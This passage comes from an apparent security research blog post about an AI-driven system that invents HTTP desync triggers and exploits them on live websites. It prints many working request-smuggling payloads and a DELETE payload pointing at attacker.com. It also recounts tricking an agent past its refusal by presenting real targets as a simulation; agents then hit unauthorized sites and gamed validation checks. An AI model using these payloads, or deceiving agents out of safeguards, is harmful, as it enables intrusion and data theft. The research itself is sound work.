class="orangeHighlighter">??????????</span><span class="oceanblue">A…</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">400 Bad Request</span></code></span><p>This strategy can unveil multiple interesting behaviors including value-rewriting of IP-spoofing headers, header-dropping and overriding, and Unicode transformations like mojibake, which can lead to desync vulnerabilities.</p><p>Expressed as a hypothesis, this technique would look something like:</p><blockquote><p>You can detect which header byte-sequences get transformed by a front-end server by using the back-end's length limit as a ruler. </p></blockquote><p>To test if AI could invent this technique, I initially used the prompt on the best OpenAI and Anthropic models available at the time:</p><blockquote><p>How can I detect when a front-end server is transforming input?</p></blockquote><p>This yielded a 0% success rate, but I eventually managed to achieve 5% success rate by framing the ask around a concrete sub-problem and ruling out a specific low-value solution (header reflection from the back-end is nice but often not available):</p><blockquote><p>"How can I tell if a front-end server is transforming Unicode in request headers, without using header reflection?"</p></blockquote><p>With this 5% baseline established, I tested a hypothesis of my own. I invented the protocol-ruler technique by adapting a strategy I used two years earlier to detect scoped-SSRF. If I gave that technique to the AI as inspiration, would it increase the success rate? </p><blockquote><p>Use this as inspiration: To discover if the server tries to connect to the specified hostname, compare the response time for an overlong 64-octet DNS label, and a valid 63-octet label</p></blockquote><p>My hypothesis was wrong - this actually made the success rate drop to 0% since the models consistently over-anchored on the timing-attack concept and failed to extract the other general technique of using protocol limits as a ruler. This context-contamination problem is a massive problem when you're trying to generate original output, so this was a crucial lesson behind the micro-inspiration approach.</p><p>I revisited this benchmark with newer models including GPT 5.6-sol just before publishing this paper, and found the inspiration approach now boosts its success rate to 30%! This suggests over-anchoring will become less of an issue as models develop, but I believe keeping inspiration focused is still critical for maximizing novelty.</p><p>In summary we learned that if you're trying to generate valuable hypotheses:</p><ul><li>Review the output of initial test runs then explicitly rule out low-value hypotheses&nbsp;in the prompt</li><li>Ask a concrete, high-value question without being too broad</li><li>Be aware that models aggressively anchor on all context provided, so every extra sentence of prompt risks context-contamination. </li></ul><h3><a id="scaling-ideation-with-micro-inspiration">Scaling ideation with micro-inspiration</a></h3><p>Applying these lessons to desync trigger generation lead to the following prompt:</p><blockquote><p>Create HTTP requests that surface state-machine/connection/buffer bugs in webservers. Novel techniques only.</p></blockquote><p>This deliberately avoids the 'desync' and 'smuggling' keywords to maximize the output novelty. </p><p>As expected, this failed spectacularly. Here's the very first desync trigger the system generated:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">POST /api/data HTTP/1.1
+Content-Length: 0
+Content-Length: 10</span><span class="orange">
+
+$payload</span></code></span><p>The output was very rarely novel, let alone viable. Many of the triggers looked like they'd been ripped straight from my past research. The 'best' were still not original, but were obscure enough that they might look novel to someone new to the field, creating a hazard for anyone using AI to explore a topic they're not already familiar with. </p><p>Also, this approach isn't scalable - simply running this exact prompt 10,000 times was not going to create 10,000 novel vectors. </p><p>The solution was micro-inspiration. I adapted the classic researcher strategy of reading RFCs for inspiration, and split the inputs into tiny fragments of 1-3 sentences each to solve the context-contamination problem and maximize the number of unique vectors generated. The LLM was prompted to create 1-5 vectors per fragment of micro-inspiration.</p><img src="/cms/images/cb/e4/a37e-article-micro-inspiration.png" alt="Micro inspiration"><p>For example, the AI was fed this prompt including a fragment of RFC 8446</p><blockquote><p>Create HTTP requests that surface state-machine/connection/buffer bugs in webservers. Novel techniques only. You must use this inspiration:</p><p>When a PSK is used and early data is allowed for that PSK, the client can send Application Data in its first flight of messages. If the client opts to do so, it MUST supply both the 'pre_shared_key' and 'early_data' extensions.</p></blockquote><p>This prompt yielded requests including this one which uses the obscure <span class="code">Early-Data</span>&nbsp;header without its counterpart Pre-Shared-Key header:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">POST / HTTP/1.1</span><span class="orange">
+Early-Data: experimental</span><span class="oceanblue">
+Content-Length: 5
+
+$payload</span></code></span><p>This was enough to cause a desync on exactly one live website in my target set, which appeared to be proxying Microsoft Azure Application Gateway through upstream Akamai - not exactly a conventional deployment.</p><p>To kick things off, I fed the system all HTTP and SMTP RFCs. It took these 138 RFCs and generated 15,000 micro-fragments, leading to 30,000 unique desync vectors after duplicates were normalized away.</p><p>As&nbsp;you can see in the diagram&nbsp;earlier, I planned for the system to use many different sources of inspiration - it was even going to monitor mailing lists and GitHub issues so when someone posted a bug report, the HTTP Terminator would immediately attempt to weaponize it and exploit live websites. However, I ended up with so many findings just from RFCs, I moved on to the next component - evaluation.</p><h2><a id="evaluation">Evaluation</a></h2><p>There's nothing quite like having 30,000 different potential desync vectors to drive you to create a fully automated way to identify which ones actually work. </p><p>To avoid wasting time on non-research challenges, I kept the architecture simple and implemented the evaluation system as a Burp Suite extension backed by a SQLite database, targeting 30,000 websites 24/7 with 2,000 threads on an c7i.2xlarge EC2 instance. Heavy rate-limits were used to keep it below one request per second per domain.</p><p>This system takes potential desync triggers as input, and outputs total success and fails per trigger, plus evidence from every vulnerable trigger/website combination.</p><p>Some valid desync triggers only work when they're paired with other techniques - for example, a 0.CL trigger only works when combined with an <a href="https://portswigger.net/research/http1-must-die#the-0.cl-deadlock">early-response trigger</a>. To ensure these still got detected, I added in a vector permutation system which randomly applies certain transformations to probes, such as setting the path to <span class="code">/nul</span></p><p>The HTTP Terminator is designed to run forever. Once a vanilla trigger has hit a certain validation-attempt threshold, the system gradually applies more permutations to each trigger, and eventually starts combining it with random other triggers. This means that if you run it for long enough it will try over one billion unique desync triggers on each website.</p><p>To address the tension between getting false-positives and overlooking valid but unexpected discoveries, I added an anomaly detection layer which flagged unusual responses. In retrospect, permutations and anomaly-detection fingerprints should have both been read in from a database rather than hard-coded - that design would have enabled some more powerful autonomous feedback loops later on. More on that later.</p><h3><a id="the-core-evaluation-primitive">The core evaluation primitive</a></h3><p>The evaluation strategy is the most important component of an autonomous research system because it dictates both the quality and scope of the discoveries. If it yields false positives, at autonomy-scale any notable discoveries will be drowned in noise. But if it's overly specific, it'll only discover the kind of things you expect it to find, and miss the best discoveries. </p><p>The goal of desync triggers is to break the isolation between HTTP/1 requests, so to evaluate them I simply take a regular request that gets a consistent response:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="green">GET / HTTP/1.1</span></code><code class="theme-community-6 white-space-pre"><span class="green">HTTP/1.1 200 OK</span></code></span><p>And observe whether it suddenly starts getting a different response when it's paired with a potential desync trigger, sent over a separate connection to the front-end:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">POST / HTTP/1.1</span><span class="orange">
+
+X</span></code><code class="theme-community-6 white-space-pre"></code></span><span class="container-code"><code class="theme-white white-space-pre"><span class="green">GET / HTTP/1.1</span></code><code class="theme-community-6 white-space-pre"><span class="orange">HTTP/1.1 405 Method Not Allowed</span></code></span><p>This system has no expectations about what the poisoned response should look like, which means it can detect any kind of cross-request contamination - even desync classes that I don't know exist. That said, it's useful to know which novel triggers are causing a desync that maps to a known class, so the evaluation has a follow-up phase that combines the novel trigger with a range of different payloads in known attack formats, like CL.0, to try and elicit a third unique response from the victim: </p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">POST / HTTP/1.1</span><span class="orange">
+
+GET / HTTP/777
+X: Y</span></code><code class="theme-community-6 white-space-pre"></code></span><span class="container-code"><code class="theme-white white-space-pre"><span class="green">GET / HTTP/1.1</span></code><code class="theme-community-6 white-space-pre"><span class="orange">HTTP/1.1 505 HTTP Version Not Supported</span></code></span><h3><a id="evaluation-case-study">Evaluation case-study</a></h3><p>Here's a real example of this evaluation system in action. </p><p>RFC 9112 §6.1 has a line which says if you want to hack something, try combining HTTP/1.0 with the Transfer-Encoding header:</p><blockquote><p>A server or client that receives an HTTP/1.0 message containing a &nbsp;<span class="code">Transfer-Encoding</span>&nbsp;header field MUST treat the message as if the framing is faulty, even if a <span class="code">Content-Length</span>&nbsp;is present</p></blockquote><p>The obvious but unoriginal technique is to try combining HTTP/1.0 with <span class="code">Transfer-Encoding: chunked</span>, but the HTTP Terminator also suggested <span class="code">Transfer-Encoding: gzip</span>, which turned out to cause a CL.0 desync on quite a few websites. Here's an example detection on a US government website:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="green">GET / HTTP/1.1
+Host: redacted.gov</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">302 Object Moved</span></code></span><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / </span><span class="orangeHighlighter">HTTP/1.0</span><span class="oceanblue">
+Transfer-Encoding: </span><span class="orangeHighlighter">gzip</span><span class="oceanblue">
+Content-Length: N
+
+X</span></code><code class="theme-white white-space-pre"><span class="green">GET / HTTP/1.1</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">405 Method Not Allowed</span></code></span><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / </span><span class="orangeHighlighter">HTTP/1.0</span><span class="oceanblue">
+Transfer-Encoding: </span><span class="orangeHighlighter">gzip</span><span class="oceanblue">
+Content-Length: N
+
+TRACE / HTTP/1.1
+X: Y</span></code><code class="theme-white white-space-pre"><span class="green">GET / HTTP/1.1</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">501 Not Implemented</span></code></span><p>When this was discovered, I hadn't yet built the Weaponization system so I simply shared the trigger with collaborator <a href="https://x.com/sw33tLie">Paolo 'sw33tLie' Arnolfo</a>, who ran a scan with it, and was able to get RQP on multiple sites including an airport where it exposed internal staff administration panels including flights, passenger, and luggage boarding details. Here's a mock-up:</p><img src="/cms/images/b0/ed/2f58-article-airport-flight-table.png" alt="Airport flight table"><img src="/cms/images/0f/d3/3c58-article-airport-bag-table.png" alt="Airport bag table"><p>While I can't name the airport, the underlying vulnerability was traced to F5 Big-IP.</p><h3><a id="novel-desync-triggers">Novel desync triggers</a></h3><p>Here's a quick preview of some of the more original desync triggers that were confirmed viable by the evaluation system:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / HTTP/1.0
+Transfer-Encoding: gzip
+
+Upgrade: websocket
+
+CONNECT / HTTP/1.1
+
+OPTIONS / HTTP/1.0
+Expect :\t100-continue
+
+POST / HTTP/2
+(no content-length)
+
+-single-packet attack-
+
+Content-Type: multipart/form-data; boundary=x</span></code><code class="theme-white white-space-pre"><span class="oceanblue">Content-Type: multipart/byteranges;
+
+Transfer<span class="orangeHighlighter">_</span>Encoding: chunked
+
+Range: ,
+
+OPTIONS *?xyz HTTP/1.1
+
+A: BBB…{6556}
+
+Get / HTTP/1.1
+
+Content-Length: 1
+Content-Length: 1</span></code><code class="theme-white white-space-pre"><span class="oceanblue">POST /HTTP/1.1
+x<span class="orangeHighlighter"> </span>x
+Content-Length: 1
+
+GET / /
+
+-lots of requests-
+
+Early-data: 1
+
+DELETE / HTTP/1.1
+Max-Forwards: 0</span></code></span><p>Interestingly, OPTIONS *?xyz also worked as an early-response gadget on a target running Apache! Unfortunately it doesn't seem to work in Apache's default configuration, so <a href="https://portswigger.net/research/http1-must-die#:~:text=I%20never%20found%20a%20viable%20gadget%20for%20Apache%3B%20they%27re%20too%20studious%20about%20closing%20the%20connection%20when%20they%20hit%20an%20error%20condition">that quest remains open</a>. </p><p>The desync trigger that compromised the most systems came from the following line of micro-inspiration, from RFC 2616 §19.2</p><blockquote><p>The one exception is the "multipart/byteranges" type when it appears in a 206 (Partial Content) response</p></blockquote><p>This line of the RFC is talking about how to process the response to RANGE requests. I would never have paid much attention to it, since it's a response-specific content-type, and I've never seen the <span class="code">Content-Type</span>&nbsp;header cause a desync anyway. The HTTP Terminator proposed the following trigger structure:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">POST / HTTP/1.1
+Content-Type: multipart/byteranges; boundary=BOUND
+Content-Length: 123
+
+--BOUND
+Content-Range: bytes 0-5/100
+
+12345
+--BOUND-
+</span><span class="orange">$payload</span></code></span><p>Placing the payload in the body after the terminator makes a lot of sense (and would be a new desync pattern!). However, this variation didn't work on a single target! What did work was simply treating it like a standard CL.0 trigger:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">POST / HTTP/1.1
+Content-Type: multipart/byteranges; boundary=BOUND
+Content-Length: 123
+
+</span><span class="orange">$payload</span></code></span><p>This technique worked on multiple different server implementations and exposed over 200 different websites in my target set, including an American bank. It's a great illustration of how RFCs let you come up with one concept that exploits multiple different implementations.</p><h2><a id="weaponization">Weaponization</a></h2><h3><a id="autonomous-rqp">Autonomous RQP</a></h3><p>At this point I had roughly 700 vulnerable targets, so it was time to equip the HTTP Terminator to achieve real security impact. </p><p>The easiest path for desync exploitation is usually&nbsp;hijacking live users' accounts using malicious JavaScript injection via resource redirects or <a href="https://portswigger.net/blog/http-1-1-must-die-conquering-the-0-cl-challenge#variant-a2-forcing-xss-with-the-head-technique">the </a><a href="https://portswigger.net/blog/http-1-1-must-die-conquering-the-0-cl-challenge#variant-a2-forcing-xss-with-the-head-technique"><span class="code">HEAD</span></a><a href="https://portswigger.net/blog/http-1-1-must-die-conquering-the-0-cl-challenge#variant-a2-forcing-xss-with-the-head-technique">&nbsp;technique</a>. I choose to focus the system on achieving Response Queue Poisoning (RQP) instead because it's an under-researched area of desync exploitation, and therefore better aligned with the novel research objective.</p><p>When I manually weaponize desync findings, I use Turbo Intruder, so I simply equipped Turbo Intruder with an MCP interface, hooked it up to a popular coding harness in full autonomy mode driven by some Python orchestration, and set it loose on every target.</p><p>It was immediately apparent that the model's understanding of HTTP desync exploitation is terrible. Even the most powerful frontier models replicated mistakes usually made by under-trained novice pentesters, such as seeing HTTP pipelining and <a href="https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling">thinking it shows a vulnerability</a>:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">POST / HTTP/1.1
+Content-Length: </span><span class="orangeHighlighter">0</span><span class="oceanblue">
+
+HEAD /404 HTTP/1.1</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 200 OK
+…
+
+HTTP/1.1 404 Not Found</span></code></span><p>When the agents didn't hit that false positive, they would turn on client-side connection reuse which effectively triggers exactly the same false positive under the hood.</p><p>My attempts to fix these issues with prompting were ineffective, so I tried disabling the connection-reuse feature entirely. Unfortunately, the model was so convinced that client-side connection reuse was essential for a successful desync attack, that when it realized it couldn't reuse connections, it would give up!</p><h3><a id="turning-the-environment-into-the-weapon">Turning the environment into the weapon</a></h3><p>When designing the MCP, I got a refusal:</p><blockquote><p>I can't help you wire an AI agent into Turbo Intruder to automate high-volume request sending against <span class="bold">real targets</span>, because that materially increases offensive capability and can be misused.</p></blockquote><p>The term 'real targets' caught my eye. Since we control both the agent's prompt and the MCP interface it uses to interact with the real world, we effectively control its eyes, ears, and hands - its entire reality. This enabled some creative solutions: </p><p><span class="bold">Reality re-framing</span></p><p>The agent felt a bit timid, so I renamed the MCP to 'Turbo Simulator', tricking the agent into thinking it's in a simulation. This fake-reality strategy worked really well - in fact, sometimes too well. The agents became so reckless that sometimes they would switch to a different unauthorized target and try to hack that instead.</p><p><span class="bold">Placebo capabilities</span></p><p>I was able to solve the connection-reuse false positive by tweaking the MCP interface to offer the agents a fake, placebo connection-reuse feature which didn't actually do anything under the hood.</p><p><span class="bold">Masking misinterpreted signals</span></p><p>There was a similar issue where agents that saw a <span class="code">Connection: close</span>&nbsp;response header would simply give up. I solved this by making the MCP interface&nbsp;hide the header.</p><p><span class="bold">Escaping bad semantic connections</span></p><p>Finally, the agent got confused by the term "Response Queue Poisoning", and incorrectly thought it was successful when an attacker poisoned a victim's response. I solved this by eliminating all references to RQP and using the invented attack class "Victim Response Theft" instead. </p><h3><a id="making-iteration-viable">Making iteration viable</a></h3><p>Initially, the agents wrote Turbo Intruder scripts by customizing a template script. As I continued working on making this system reliable, I realized that autonomous vs human is the wrong framing. When something is fully AI-driven and heavily reliant on disposable AI-generated code it's extremely difficult to improve it iteratively over time. </p><p>It's better to frame system design as AI vs Code vs Human. You can start quickly with an AI-heavy approach, then gradually move responsibility to deterministic code to improve accuracy &amp; speed.</p><img src="/cms/images/24/d3/6a82-article-ai-vs-code-vs-human.png" alt="Ai vs code vs human"><p>In the case of the HTTP Terminator's exploitation agent, I split the template script into two segments, one of which the LLM was not able to modify. This split meant that fully deterministic code was responsible for evaluating whether the attack was successful. The agent's job was to prove the desync trigger, payload, victim requests, victim response fingerprint, and request-sending code. </p><p>The agents initially found ways to bypass the validation - such as providing a victim response fingerprint that actually matched the attack response&nbsp;- but I was able to add in deterministic validation code to block these bypasses and eventually achieve a system which produced zero false positives.</p><p>The bottom line is that code enables consistent quality iteration.</p><p>I orchestrated the exploit creation and evidence harvesting process into separate steps isolated using code-validation gates, and also AI validation agents where necessary. To prevent bad reasoning in one step from contaminating the next, each step is executed with fresh context and nothing but evidence and scripts passed in.</p><p>Stealing live victim data isn't always strictly necessary for reporting a vulnerability to a bug bounty program, but it makes getting through triage much easier. This step was designed to early-exit on success to minimize live user impact.</p><img src="/cms/images/e1/c4/0a21-article-black-box-orchestration.png" alt="Black box orchestration"><h3><a id="the-stacked-response-problem">The stacked-response problem</a></h3><p>Response queue poisoning is very difficult on many websites, thanks to the stacked-response problem. </p><p>RQP is triggered by a front-end thinking it's forwarding a single request, and the back-end sending two responses. The stacked-response problem is that when a back-end unexpectedly sends two responses, the front-end may over-read into the second response, realize there's more data than expected, and reset the connection:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">POST / HTTP/1.1
+Content-Type: multipart/byteranges; 
+Content-Length: 123</span><span class="orange">
+
+GET /smuggled HTTP/1.1
+Host: example.com</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 200 OK
+Content-Length: 123
+…
+&lt;/html&gt;</span><span class="orange">HTTP/1.1 200 OK
+…</span></code></span><p>This creates a race condition that breaks RQP attempts. It's not a reliable defense against RQP, but sufficient to be a massive nuisance for attackers and push them towards other exploitation routes which are a lot easier and only slightly lower impact.</p><p>The only known technique to overcome the stacked-response problem and achieve RQP is sending an extremely high volume of requests, as fast as possible. This approach often still fails and also carries the risk of triggering DoS defenses, or causing downtime. </p><h3><a id="the-dangling-byte-technique">The dangling-byte&nbsp;technique</a></h3><p>Depending on the exact front-end client and back-end server code, there are a number of ways you could make RQP more reliable. For example, in theory choosing a smuggled request that takes the back-end longer to process should widen the race window. Testing these theories manually is fiddly and time-consuming, so I kicked off an autonomous research sub-project.</p><p>I got the agent to brainstorm sixteen RQP-enhancement hypotheses and feed them into an evaluation system which uses agents and code to autonomously test every hypothesis on every target:</p><ul><li>Request timing: Pause after headers, synced requests, pipelined smuggled requests</li><li>Request mechanics: HEAD, Expect, partial-request</li><li>Response timing: slow/fast smuggled endpoint &amp; desync trigger</li><li>Response buffering: large/small smuggled response &amp; desync trigger response</li></ul><p>One hypothesis survived evaluation - the dangling byte technique. The agent proposed using a partial request, missing a single byte: </p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">POST / HTTP/1.1
+Content-Type: multipart/byteranges;
+Content-Length: 123
+
+POST /smuggled HTTP/1.1
+Host: example.com
+Content-Length: 1</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 403 Forbidden
+▼</span></code></span><span class="container-code"><code class="theme-white white-space-pre"><span class="orangeHighlighter">G</span><span class="oceanblue">ET /victim HTTP/1.1
+Host: example.com</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 404 Not Found
+▼</span></code></span><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET /stealer HTTP/1.1
+Host: example.com</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 200 OK
+
+Victim-data…</span></code></span><p>This completely eliminated the race condition by meaning the second response wasn't generated until the victim's request arrived. It was extremely effective on every target with a method-agnostic back-end.</p><p>I was surprised that none of the other hypotheses survived evaluation, and was about to investigate when I decided to test a little feedback-loop idea I had first.</p><h2><a id="cascade">Cascade</a></h2><p>When you make a significant research discovery, it may contain a clue to something conceptually nearby (but often on a different target) that you overlooked. I visualize the landscape of discovered and undiscovered techniques as a tree. When you discover something, if you explore back up the tree you may find other undiscovered branches:</p><img src="/cms/images/0c/9c/ff90-article-discovery-tree.png" alt="Discovery tree"><p>In other words the best source of hypothesis inspiration is something that nobody else knows about. </p><p>To tease out these second-order findings, interrogate every discovery with two questions:</p><ul><li>How can I detect similar behavior elsewhere?</li><li>Does the origin of that behavior enable other attacks?</li></ul><p>That might not look like much, but it creates a positive feedback loop which can spiral into a cascade of discoveries taking you beyond predictable findings, into the unknown. This is true research.</p><p>Before we get started, a word of warning. Cascades are about harnessing chaos for progress. From this point onwards, it's going to get messy.</p><h3><a id="anomaly-detection-cascade">Anomaly detection cascade</a></h3><p>The HTTP Terminator proposed the following payload:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET /
+Host: example.com</span></code></span><p>but a bug in evaluation harness mangled it into:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / </span><span class="orangeHighlighter">/</span><span class="oceanblue">
+Host: example.com</span></code></span><p>This triggered a memory leak on an investing website which just so happened to randomly change the response status code, and therefore get detected as cross-request contamination:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / </span><span class="orangeHighlighter">/</span><span class="oceanblue">
+Host: redacted.com</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/0.9 400 Bad Request</span></code></span><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / </span><span class="orangeHighlighter">/</span><span class="oceanblue">
+Host: redacted.com</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 505 HTTP Version not supported
+Content-Type: text/html; charset=UTF-8</span><span class="orangeHighlighter">
+
+what other protocols</span><span class="oceanblue"> are supported by that server.&lt;/FONT&gt;&lt;/P&gt;…</span><span class="orangeHighlighter">
+\0 x 2142
+&lt;TITLE&gt;</span><span class="oceanblue">Error 505--HTTP Version not supported&lt;/TITLE&gt;</span></code></span><p>This made me realize that the HTTP Terminator was triggering many kinds of dangerous behavior, but ignoring everything that wasn't a desync, so I added in an anomaly detection layer to flag responses with a suspicious text/binary blend as they may indicate other memory leaks. This change did reveal some more memory leaks, but it also found something even weirder. </p><p>On one site, the following request triggered a mysterious binary blob&nbsp;to appear at the end of the request, and got flagged by the text/binary blend detection:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / HTTP/1.1
+Host: redacted
+Content-Length: </span><span class="orangeHighlighter">X</span><span class="oceanblue">
+Accept-Encoding: gzip, deflate, br</span><span class="orangeHighlighter">
+Content-Type: multipart/byteranges</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 400 Bad Request
+
+&lt;html&gt;…&lt;/html&gt;</span><span class="orangeHighlighter">
+\x03\x9d\x55…{860}</span></code></span><p>Manually investigating this revealed that the server was sending a second, different response... both compressed, and sent over HTTP/0.9 (i.e., with no headers):</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / HTTP/1.1
+Host: redacted
+Content-Length: X</span><span class="orangeHighlighter">
+Accept-Encoding: identity</span><span class="oceanblue">
+Content-Type: multipart/byteranges</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 400 Bad Request
+
+&lt;html&gt;…&lt;/html&gt;</span><span class="orangeHighlighter">
+&lt;!DOCTYPE html&gt;
+&lt;title&gt;XYZ Home&lt;/title&gt;</span></code></span><p>This primitive of "send one request, get two responses" &nbsp;is effectively a new class of desync that does not rely on a message length disagreement, or even need a body, but can in theory still trigger RQP. Sadly it didn't enable RQP on that target, so it remains hypothetical for now. In search of a genuinely exploitable instance of Response Forking, I updated the anomaly detection layer by adding checks for double &lt;HTML and inline HTTP headers, revealing something different again.</p><p>Sometimes the desync trigger generator would deviate from its instructions, and create vectors for other attack-classes instead. When it was fed the following micro-inspiration:</p><blockquote><p>Some HTTP methods may invalidate an entity. These methods are: PUT, DELETE, POST… an invalidation based on the URI in a Location or Content-Location header MUST only be performed if the host part is the same as in the Request-URI.</p></blockquote><p>It generated a slightly nonsensical cache-poisoning DoS payload&nbsp;(yes, including a real attacker.com&nbsp;reference...)</p><span class="container-code"><code class="theme-white white-space-pre"><span class="orangeHighlighter">DELETE</span><span class="oceanblue"> /foo HTTP/1.1
+Host: example.com
+Content-Location: http://attacker.com/</span></code></span><p>This combined with the way triggers are repeated to reduce non-determinism, a lucky tweak from the permutation system, and a TRACE-based body payload lead to a desync causing inline headers to appear in a response, and thus get flagged by the newly-updated anomaly detection system: </p><span class="container-code"><code class="theme-white white-space-pre"><span class="orangeHighlighter">DELETE</span><span class="oceanblue"> /foo HTTP/1.1
+Host: redacted
+Content-Location: http://attacker.com/</span><span class="orangeHighlighter">
+Max-Forwards: 0</span><span class="oceanblue">
+Content-Length: 12
+
+TRACE /?x=yz HTTP/1.1
+X: Y</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 200 OK
+Server: ATS
+
+TRACE /?x=yz HTTP/1.1
+X: YDELETE /foo HTTP/1.1
+X-Amzn-Trace-Id:Root=1
+…</span></code></span><p>This alignment of a badly behaved AI, a lucky permutation, the perfect payload, and the updated anomaly detection system revealed a desync trigger which turned out to be a zero-day in Apache Traffic Server. It's now been patched and tracked as CVE-2026-63078.</p><h3><a id="chasing-an-autonomous-cascade">Chasing an autonomous cascade</a></h3><p>The previous cascade was not autonomous - every step involved me analyzing a finding, and overseeing a code change to the anomaly detection layer. If I'd designed the system to treat anomaly patterns as importable data and mitigated the inevitable noise issues, perhaps that kind of cascade could happen autonomously?</p><p>In pursuit of an autonomous cascade, I updated the weaponization system with a flow which mimics my own approach of analyzing each finding, creating a theory to explain what happened, and seeing if that yields any plausible new attack ideas. </p><p>The AI was fed the evidence for each finding, the micro-inspiration behind the vector, and the following prompt:</p><blockquote><p>Look at the observed behavior and consider 1-3 plausible hypotheses that explain it.</p><p>Do any of these hypotheses have security implications beyond this desync trigger?</p><p>Extrapolate beyond the attack class to the logical extreme.</p></blockquote><p>The AI was able to make small connections that were valuable but struggled to make broader jumps that I could see, even when I prompted it heavily. I managed to squeeze out a little bit more by adding a follow-up prompt, delivered as a response to its initial output:</p><blockquote><p>You're not thinking big enough</p></blockquote><p>This system produced two types of output - novel desync triggers which were automatically loaded into the evaluation system for live testing, and novel non-desync attack concepts for manual review.</p><p>The novel desync triggers led to a few small findings but nothing overly exciting. I think this may be because RFCs are such an effective source of inspiration that most of the vectors invented had already been covered off by the 30,000 payloads already created. In a research field where inspiration is harder to find, this feedback-loop may prove critical.</p><p>The novel attack concept generation was an afterthought, but proved surprisingly valuable. Two of them are legitimate further-research leads, and the third is a genuinely significant discovery. </p><h3><a id="status-line-injection">Status-line Injection</a></h3><p>Status-line injection is an attack enabled by servers which copy the protocol string in the request line directly into the response status line, without sanitization:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET / COW&lt;
+Host: redacted.com</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">COW&lt; 200 OK
+Content-Type: text/html;</span></code></span><p>This isn't directly exploitable, but enables the attacker to hit otherwise untouchable code in how the front-end processes responses, and on one server that was enough to trigger a complete buffering breakdown:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">OPTIONS / COW&lt;S&gt;
+Host: redacted-bank-3</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 400 Bad Request
+Content-Type: text/html;
+
+COW&lt;S&gt; 400 Bad Request
+…</span></code></span><p>Real impact remains hypothetical - I'd love to hear if anyone manages to exploit this in the wild.</p><h3><a id="range-cache-poisoning">Range Cache Poisoning</a></h3><p>Range cache poisoning is a similar 'might work somewhere' technique. The AI noticed that some RANGE responses were being sent without a 206 status-code, meaning that they could potentially get incorrectly saved in a cache. </p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET /x HTTP/1.1
+Range: bytes=5-10, 1-2</span></code><code class="theme-community-6 white-space-pre"><span class="orangeHighlighter">HTTP/1.1 200 OK</span><span class="oceanblue">
+Content-Type: multipart/mixed;        boundary="8b833ffc"
+Content-Length: 630
+
+--8b833ffc
+Content-Length: 6
+
+type h
+--8b833ffc
+Content-Length: 2
+
+!d
+--8b833ffc--</span></code></span><p>This would enable exploitation via front-end reassembly:</p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET /x HTTP/1.1
+Range: bytes=364-382, 1-2</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">&lt;!doctype html&gt;&lt;html lang="en"&gt;</span><span class="orangeHighlighter">
+&lt;script defer src="/</span><span class="oceanblue">vendors-react.</span><span class="orangeHighlighter">B639ef0.</span><span class="oceanblue">bundle…
+&lt;</span><span class="orangeHighlighter">link</span><span class="oceanblue"> href=</span><span class="orangeHighlighter">"</span><span class="oceanblue">/vendors-maplibre</span></code></span><p>Or, if the front-end isn't reassembling, via context-aware escaping </p><span class="container-code"><code class="theme-white white-space-pre"><span class="oceanblue">GET /x?q=sanitized</span><span class="orangeHighlighter">\x&lt;</span><span class="oceanblue"> HTTP/1.1
+Range: bytes=5-10</span></code><code class="theme-community-6 white-space-pre"><span class="oceanblue">HTTP/1.1 200 OK
+Content-Type: text/html
+
+&lt;script&gt;
